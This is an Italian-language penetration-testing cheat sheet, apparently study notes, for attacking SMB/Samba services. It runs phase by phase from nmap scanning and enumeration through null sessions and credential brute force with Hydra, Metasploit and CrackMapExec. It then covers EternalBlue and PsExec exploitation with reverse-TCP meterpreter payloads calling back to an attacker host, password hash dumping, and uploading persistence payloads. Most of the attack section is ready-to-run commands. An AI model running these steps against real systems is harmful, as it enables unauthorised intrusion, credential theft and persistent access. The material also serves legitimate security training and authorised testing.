# SMB & Samba Enumeration & Exploitation

**SMB (Server Message Block)** è un protocollo di rete utilizzato principalmente nei sistemi Windows per la condivisione di file, stampanti e altre risorse. <br>
**Samba** è la sua implementazione libera in ambiente Linux/Unix, consentendo l’interoperabilità tra Windows e Linux. <br>
Entrambi operano sulle porte `445/TCP` (moderno) e `139/TCP` (legacy via NetBIOS). SMB/Samba è spesso abilitato di default, rendendolo un obiettivo comune durante un penetration test.

---

## Fase 1 – Scansione e Identificazione del Servizio

Per rilevare la presenza del servizio SMB/Samba e identificare la versione:

`nmap -sV -p139,445 <target>` ⟶ rileva SMB sulle porte NetBIOS e SMB Direct

Per ottenere maggiori informazioni:
- `nmap --script smb-os-discovery <target>` ⟶ sistema operativo, dominio, NetBIOS
- `nmap --script smb-enum-shares <target>` ⟶ condivisioni disponibili
- `nmap --script smb-enum-users <target>` ⟶ utenti configurati
- `nmap -p445 --script smb-vuln-ms17-010 <IP>` ⟶ verifica EternalBlue per Windows

Con Metasploit:
- `use auxiliary/scanner/smb/smb_version` ⟶ verifica versione SMB
- `use auxiliary/scanner/smb/smb_ms17_010` ⟶ verifica vulnerabilità EternalBlue per Windows

Identificare la versione aiuta a cercare exploit con:
`searchsploit samba <versione>`

Versioni vulnerabili comuni:
- **SMBv1** ⟶ EternalBlue (MS17-010)
- **Windows XP/2003/7 non patchati** ⟶ buffer overflow
- **vsrvsvc** ⟶ vulnerabilità RPC

---

## Fase 2 – Enumerazione Manuale del Servizio

### smbclient
Client simile a FTP per connettersi e interagire con le share:
- `smbclient -L //<target>/ -N` ⟶ condivisioni anonime
- `smbclient -L <IP> -U <username>` ⟶ share disponibili per utente
- `smbclient //<target>/<share> -U <username>` ⟶ accesso alla share

Comandi interni:
- `?`, `ls`, `get <file>`, `put <file>`, `cd`, `mkdir`, `rmdir`

### smbmap
Consente di elencare share e permessi associati:
- `smbmap -H <IP> -u <username> -p <password>`

Permessi comuni:
- `R` = lettura, `W` = scrittura, `-` = nessun accesso

### enum4linux
Strumento completo basato su `smbclient`, `rpcclient`, `nmblookup`:
- `enum4linux -a <IP>` ⟶ utenti, share, NetBIOS, gruppi, policy

### rpcclient
Permette l’interazione con i servizi RPC via SMB:
- `rpcclient -U "" <IP>` ⟶ connessione null session
- Comandi: `enumdomusers`, `enumdomgroups`, `queryuser <RID>`

---

## Fase 3 – Verifica Null Session

Una **null session** è una connessione SMB senza credenziali, potenzialmente utile per ottenere:
- Nomi utenti
- Share
- Informazioni di dominio

Test:
- `rpcclient -U "" <target>`
- `smbclient -L //<target>/ -N`

---

## Fase 4 – Brute Force delle Credenziali

### Con Hydra
`hydra -L <userList> -P <passwordList> <IP> smb` ⟶ attacco SMB/Samba

### Con Metasploit
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS <IP>
set USER_FILE <user_list>
set PASS_FILE <pass_list>
run
```

### Con CrackMapExec
- `crackmapexec smb <target> -u <user> -p <password>` ⟶ verifica credenziali
- `crackmapexec smb <target> --shares` ⟶ elenca condivisioni
- `crackmapexec smb <target> --users` ⟶ enumera utenti

---

## Fase 5 – Exploitation

### Exploit EternalBlue (MS17-010)

Con Metasploit:
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set SMBPIPE BROWSER
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <KaliIP>
set LPORT <Port>
run
```

Una volta ottenuta la shell:
- `getuid`, `getprivs`, `hashdump`

Con <a href="https://github.com/3ndG4me/AutoBlue-MS17-010">AutoBlue-MS17-010</a>:
```bash
cd AutoBlue-MS17-010/shellcode
chmod +x shell_prep.sh
./shell_prep.sh
nc -nvlp 4444
python eternalblue_exploit7.py <IP> shellcode/sc_x64.bin
```

### PsExec (Metasploit)
```bash 
use exploit/windows/smb/psexec
set RHOSTS <IP>
set SMBUser <username>
set SMBPass <password>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <KaliIP>
set LPORT <Port>
run
```

### Impacket – psexec.py
`psexec.py <username>@<IP> cmd.exe`⟶ accesso CMD remoto via SMB <br>
Percorso tipico: `/usr/share/doc/python3-impacket/examples/psexec.py`

---

## Fase 6 – Post Exploitation

Dopo l’accesso:
- Scarica `.txt`, `.conf`, `.xml`, `.ini`, `.bak`
- Carica payload/script di persistence
- Verifica se le share sono usate da processi attivi o servizi web

Comandi utili:
- `wget smb://<IP>`
- `curl smb://<IP>`
- `lftp <IP>`

---
